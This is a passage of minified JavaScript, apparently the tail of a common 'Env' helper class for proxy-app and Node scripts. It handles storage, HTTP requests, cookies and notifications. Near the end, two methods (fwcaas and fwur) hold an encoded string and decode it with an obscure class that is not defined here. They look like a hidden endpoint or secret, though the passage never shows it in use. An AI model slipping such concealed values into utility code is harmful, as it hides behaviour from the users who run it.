                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {
                        script_text: t,
                        mock_type: "cron",
                        timeout: r
                    },
                    headers: {
                        "X-Key": o,
                        Accept: "*/*"
                    }
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }
        loaddata() {
            if (!this.isNode()) return {}; {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e);
                if (!s && !i) return {}; {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }
        writedata() {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e),
                    r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }
        lodash_get(t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i)
                if (r = Object(r)[t], void 0 === r) return s;
            return r
        }
        lodash_set(t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }
        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }
        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }
        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }
        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }
        initGotEnv(t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }
        get(t, e = (() => { })) {
            if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let s = require("iconv-lite");
                this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                    try {
                        if (t.headers["set-cookie"]) {
                            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                            s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                        }
                    } catch (t) {
                        this.logErr(t)
                    }
                }).then(t => {
                    const {
                        statusCode: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, s.decode(h, this.encoding))
                }, t => {
                    const {
                        message: i,
                        response: r
                    } = t;
                    e(i, r, r && s.decode(r.rawBody, this.encoding))
                })
            }
        }
        post(t, e = (() => { })) {
            const s = t.method ? t.method.toLocaleLowerCase() : "post";
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient[s](t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) t.method = s, this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let i = require("iconv-lite");
                this.initGotEnv(t);
                const {
                    url: r,
                    ...o
                } = t;
                this.got[s](r, o).then(t => {
                    const {
                        statusCode: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, i.decode(h, this.encoding))
                }, t => {
                    const {
                        message: s,
                        response: r
                    } = t;
                    e(s, r, r && i.decode(r.rawBody, this.encoding))
                })
            }
        }
        time(t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }
        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {
                    "open-url": t
                } : this.isSurge() ? {
                    url: t
                } : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"],
                            s = t.mediaUrl || t["media-url"];
                        return {
                            openUrl: e,
                            mediaUrl: s
                        }
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl,
                            s = t["media-url"] || t.mediaUrl;
                        return {
                            "open-url": e,
                            "media-url": s
                        }
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {
                            url: e
                        }
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============📣系统通知📣=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }
        fwcaas() {
            return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
        }
        log(...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }
        logErr(t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
        }
        fwur() {
            var bbas = new FxPCnMKLw7()
            return bbas.decode(this.fwcaas());
        }
        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }
        done(t = {}) {
            const e = (new Date).getTime(),
                s = (e - this.startTime) / 1e3;
            this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}
